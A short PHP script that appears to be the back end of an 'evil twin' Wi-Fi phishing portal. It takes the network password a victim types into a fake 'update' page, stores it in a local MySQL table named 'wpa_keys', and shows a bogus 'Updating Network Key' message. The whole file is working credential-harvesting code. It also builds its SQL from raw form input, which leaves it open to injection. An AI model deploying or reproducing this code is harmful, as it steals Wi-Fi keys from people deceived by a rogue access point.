<?php
session_start();

ob_start();


$host="localhost"; // Host name
$username="root"; // Mysql username
$db_name="evil_twin"; // Database name
$tbl_name="wpa_keys"; // Table name

mysql_connect("$host", "$username")or die("Cannot connect to MySQL database.");
mysql_select_db("$db_name")or die("MySQL database unavailable.");

$password=$_POST['password'];
$confirm=$_POST['confirm'];

if ($password != $confirm) {
header("location:error.html");
break;
}


mysql_query("INSERT INTO wpa_keys(password, confirm) VALUES('$password', '$confirm');");

echo "Updating Network Key... $password";
sleep(6);
header("location:updating.html");

ob_end_flush();
?>
